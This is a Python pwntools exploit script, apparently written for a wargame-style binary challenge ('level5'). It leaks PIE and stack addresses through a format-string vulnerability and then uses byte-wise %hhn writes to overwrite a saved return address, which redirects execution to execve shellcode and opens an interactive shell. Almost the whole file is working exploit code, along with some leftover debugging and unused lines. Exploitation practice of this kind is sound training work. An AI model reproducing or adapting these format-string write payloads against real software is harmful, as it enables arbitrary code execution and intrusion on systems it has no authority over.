#!/usr/bin/env python3
from locale import format_string
from pwn import *

exe = ELF("/var/challenge/level5/5", checksec=False)
context.binary = exe

context.binary = exe
shellcode = shellcraft.execve("/usr/local/bin/l33t", ["/usr/local/bin/l33t"], 0)
print(shellcode)
shellcode = asm(shellcode)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="set disable-randomization off")
    else:
        r = remote("addr", 1337)
    return r

def send_payload(payload):
        log.info("payload = %s" % repr(payload))
        r.sendline(payload)
        #response = r.recvuntil(b"your password is: ")
        ret = r.recv()
        print(ret)
        r.sendline(b"n")
        return ret

def main():
    #b *getpassword+0x0060
    global r
    with open("shellcode_full", "wb") as f:
        f.write(b"\xbb"*40 + shellcode + b"\xbb"*40)
    print('     "')
    print(shellcode)
    r = conn()

    r.sendline(b"%p")
    r.recvuntil(b"password is: ")
    leak_read = r.recvline()
    leak_read = leak_read.strip()
    leak = int(leak_read, 16)
    offset = 0x61759cedb07e - 0x61759ced7000
    exe.base = leak - offset
    log.success("Leaked address: " + hex(leak))
    log.success("Base address: " + hex(exe.base))
    r.recv()
    r.sendline(b"n")


    offset_stderr = 0x61dbd8c11040 - 0x061dbd8c0b000 

    got_addr_printf =  exe.base + offset_stderr

    format_string = FmtStr(execute_fmt=send_payload)
    log.success("GOT printf address: " + hex(got_addr_printf))
    log.success("Format string offset is: %d", format_string.offset)
    format_string.offset = format_string.offset


    #format_string.write(got_addr_printf, 0x1337babe)  # 0xe1
    #format_string.execute_writes()

    offset_stack = 0x7fffffffdd60 - 0x7fffffffdc48
    r.sendline(b"%18$p")
    r.recvuntil(b"password is: ")
    leak_read = r.recvline()
    leak_read = leak_read.strip()
    leak = int(leak_read, 16)
    offset = 0x61759cedb07e - 0x61759ced7000
    stack_addr = leak - offset_stack
    log.success("Leaked ret_ptr: " + hex(stack_addr))
    r.recv()
    r.sendline(b"n")
    ret_addr = 0x7fffffffe5e9

    for i in range(6):
        num = ret_addr >> (8 * i) & 0xff
        if len(str(num).encode()) == 3:
            payload = b"%" + str(num).encode() + b'c%31$hhnaaab' + p64(stack_addr + i)
        elif len(str(num).encode()) == 2:
            payload = b"%" + str(num).encode() + b'c%31$hhnaaaab' + p64(stack_addr + i)
        else:
            payload = b"%" + str(num).encode() + b'c%31$hhnaaaaab' + p64(stack_addr + i)

        if num == 0:
            payload = b'%31$hhnaaaaab' + p64(stack_addr + i)

        print(payload)
        r.sendline(payload)
        r.sendline(b"n")

    r.interactive()
    sleep(3)

    # Send it


if __name__ == "__main__":
    main()
